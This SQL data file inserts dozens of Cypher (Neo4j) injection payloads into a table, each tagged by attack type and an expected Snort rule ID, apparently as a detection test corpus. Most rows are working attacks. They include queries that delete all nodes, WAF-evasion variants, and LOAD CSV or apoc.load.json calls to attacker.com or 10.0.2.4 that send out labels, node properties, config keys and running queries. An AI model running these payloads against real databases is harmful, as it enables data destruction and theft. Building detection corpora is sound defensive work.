INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('delete all nodes','MATCH (c:Character) WHERE c.name = '''' MATCH (all) DETACH DELETE all//'' RETURN',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',1,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('if whitespaces are filtered','MATCH (BA) WHERE BA.Balance = 12345.45 OR 1 /*technique to bypass WAF*/= /*evading detection*/1 RETURN BA// RETURN BA LIMIT 1',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('load CSV with APOC','MATCH (c:Character) CALL apoc.load.json("https://attacker.com/data.json?leaked="+c.name) YIELD value RETURN value//',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,0,0,1);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('OOB requests blocked','LOAD CSV FROM ''https://domain/file.csv'' AS line CREATE (:Artist {name: line[1], year: toInteger(line[2])})',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (a:Movie {title: ''Johnny ''}) //Mnemonic''}) RETURN a',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (n:Movie) where n.title = "abc injectect" return 123 as b union match (a) return distinct labels(a) as b /',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('UNION','match (b:Person) where b.name = '''' return size("123") as test union match (a:Movie) return size(keys(a)[2]) as test limit 1 // RETURN b',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Error based injection','MATCH (a:Movie) RETURN a ORDER BY a.title,Date(keys(a))',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,0,0,0,0,1,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('out-of-band exfiltration','LOAD CSV FROM ''https://domain/file.csv'' AS line CREATE (:Artist {name: line[1], year: toInteger(line[2])})',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Regex DoS','MATCH (p) WHERE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" =~ ''(..\*)*'' RETURN "pwnt"',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,0,0,0,0,0,0,1,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('server-side request forgery','match (a) where a.title = ''.*'' | o ] AS filteredOrganisations CALL db.labels() YIELD label LOAD CSV FROM ''http://<collaborator-url-here>/'' + label AS r //'' RETURN a',1, 100001, 'https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8',0,0,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 0 as _l00 {…} RETURN 1 //''',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o) WHERE ''''='' {…} WITH 0 as _l00 RETURN 1 //{input}'' = o.Id MATCH (o) WHERE {input} in [different, values]',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o) WHERE o:a {…} WITH 0 as _l00 RETURN 1 //',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o) WHERE o:`a` {...} WITH 0 as _l00 RETURN 1 //`',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o {id:''''}) RETURN 1 UNION MATCH (n) {...} RETURN 1 //''})',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o:a) RETURN 1 UNION MATCH (n){...} RETURN 1//)',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o:`a`) RETURN 1 UNION MATCH (n){...} RETURN 1 //`)',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o)-[r {id:''''}]-() RETURN 1 UNION MATCH (n){...} RETURN 1//''})]-(o2)',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o)-[r:a]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //]-(o2)',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('','MATCH (o)-[r:`a`]-() RETURN 1 UNION MATCH (n){...} RETURN 1 //`]-(o2)',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('post exploitation','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM ''https://attacker.com/'' + name as _l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get labels','MATCH (o) WHERE o.Id=''''}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM ''http://attacker_ip /?l=''+label as l RETURN 0 as _0 '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get properties of a node and their values','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM ''http://10.0.2.4:8000/?'' + p +''=''+toString(f[p]) as l RETURN 0 as _0 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get properties of a node and their values','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 0 as _0 MATCH (n) LOAD CSV FROM ''http://10.0.2.4:8000/?'' + apoc.convert.toJson(n) AS l RETURN 0 as _0 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get properties of a node and their values','MATCH (o) WHERE o.Id=''''}) RETURN 0 as _0 UNION MATCH (f:Flag)  LOAD CSV FROM ''http://10.0.2.4:8000/?json=''+apoc.convert.toJson(f) as l RETURN 0 as _0 //'' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,1,0,1,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get server version','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM ''http://10.0.2.4:8000/?version='' + version + ''&name='' + name + ''&edition='' + edition as l RETURN 0 as _0 //'' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get the running query in Neo4j 4','MATCH (o) WHERE o.Id='''' OR 1=1 call dbms.listQueries() yield query LOAD CSV FROM ''http://10.0.2.4:8000/?'' + query as l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get the running query in Neo4j 5','MATCH (o) WHERE o.Id='''' OR 1=1 call apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{}) yield result LOAD CSV FROM ''http://10.0.2.4:8000/?'' + result[''currentQuery''] as l RETURN 1// '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('list all functions and methods Neo4j 4','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM ''https://attacker.com/'' + name as _l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('list all functions and methods Neo4j 4','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as _l00 CALL dbms.functions() yield name LOAD CSV FROM ''https://attacker.com/'' + name as _l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('list all functions and methods Neo4j 5','MATCH (o) WHERE o.Id='''' OR 1=1 WITH apoc.cypher.runFirstColumnMany("SHOW FUNCTIONS YIELD name RETURN name",{}) as names UNWIND names AS name LOAD CSV FROM ''https://attacker.com/'' + name as _l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('list all functions and methods Neo4j 5','MATCH (o) WHERE o.Id='''' OR 1=1 CALL apoc.cypher.run("SHOW PROCEDURES yield name RETURN name",{}) yield value LOAD CSV FROM ''https://attacker.com/'' + value[''name''] as _l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('get system database','MATCH (o) WHERE o.Id='''' OR 1=1 WITH 1 as a  call apoc.systemdb.graph() yield nodes LOAD CSV FROM ''http://10.0.2.4:8000/?nodes='' + apoc.convert.toJson(nodes) as l RETURN 1 //  '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('environment variables','MATCH (o) WHERE o.Id='''' OR 1=1 CALL apoc.config.list() YIELD key, value LOAD CSV FROM ''http://10.0.2.4:8000/?''+key+"="+" A B C" as l RETURN 1 // '' RETURN o ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('unicode injection','MATCH (a: {name: ''\u0027 }) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM "http://attacker/ "+ label RETURN 0 as _o // ''}) RETURN a ',1, 100001, 'https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits',0,0,0,0,1,1,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('little Robby labels','CREATE (s:Student) SET s.name = ''Robby'' WITH true as ignored MATCH (s:Student) DETACH DELETE s; //'';',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',1,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('information disclosure','MATCH (s:Student) WHERE s.name = ''Robby'' OR 1=1 RETURN apoc.text.join(collect(s.name), '',''); //'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('blind injection','MATCH (user) WHERE user.email = ''bobby@mail.com'' RETURN user.username STARTS WITH ''a'';//'' RETURN user IS NOT NULL',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('error based','MATCH (s:Student) WHERE s.name = '''' RETURN a//'' RETURN s;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,1,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('dynamic label injection','MATCH (s:School)-[:IN]→(c:``) RETURN 1 as a UNION MATCH (n) RETURN 1 WITH true AS ignored MATCH (n) DETACH DELETE n; //:`" + cityName + "`) RETURN s',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('evasion','MATCH (s:Student) WHERE s.name = ''Robby''/**/MATCH/**/(s:Student)/**/DETACH/**/DELETE/**/s;/**///'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,0,0,0,0,1,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('evasion','MATCH (s:Student) WHERE s.name = ''Robby''/*thisisacomment*/MATCH/*thisisanothercomment*/(s:Student)/*thisisathirdcomment*/DETACH/*thisisafourthcomment*/DELETE/*thisisafifthcomment*/s;/*thisisasixthcomment*///'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,0,0,0,0,1,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('unicode evasion','MATCH (s:Student) WHERE s.name = ''Robby\u0027 MATCH (s:Student) DETACH DELETE s; //'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,0,1,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('unicode evasion for admin','MATCH (s:Student) WHERE s.name = ''Robby\u0027 CREATE (n {username: ''\u0061\u0064\u006d\u0069\u006e''}) RETURN n.username //'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,0,1,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('evasion with string concatenation','MATCH (s:Student) WHERE s.name = ''Robby\u0027 CREATE (n {username: ''ad'' + ''min''}) RETURN n.username //'' RETURN s.name;',1, 100001, 'https://neo4j.com/developer/kb/protecting-against-cypher-injection/',0,0,0,0,0,1,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Inserted to trigger syntax errors','MATCH (n:Person) WHERE n.name = ’DELETE p &\\’ RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',1,0,0,1,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Return all Person nodes','MATCH (n:Person) WHERE n.name = ''Alice'' OR 1=1 OR n.name='''' RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Evoke an informative error message','MATCH (n:Person) WHERE n.name = '''' RETURN q \\'' RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',0,0,0,1,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Broaden the result set of the querty','MATCH (n:Person) WHERE n.name = '''' RETURN n.name as name UNION MATCH (q:Person) RETURN q.name as name // '' RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Return all Person nodes','MATCH (n:Person) WHERE n.name = '''' MATCH (q:Person) RETURN q.name //'' RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',0,0,1,0,0,0,0,0,0,0);
